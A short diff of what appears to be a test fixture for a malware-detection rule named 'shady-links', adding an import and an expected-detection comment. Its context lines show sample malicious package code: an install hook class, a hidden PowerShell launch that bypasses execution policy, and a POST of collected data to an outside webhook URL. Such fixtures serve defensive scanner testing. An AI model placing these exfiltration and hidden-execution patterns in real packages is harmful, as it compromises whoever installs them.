@@ -1,10 +1,12 @@
 import base64
+import json
 import os
 import socket
 import subprocess
 from urllib.request import urlopen
 
 import urllib3
+from requests import request
 
 
 class eupolyzoan(install):
@@ -35,6 +37,7 @@ os.system("powershell -window hidden -executionpolicy bypass (New-object system.
 
 # ruleid: shady-links
 request(
+    # ruleid: shady-links
     url='http://us.dslab.pw/webhook.php',
     method='POST',
     data=json.dumps(data).encode("utf-8", errors='ignore'),
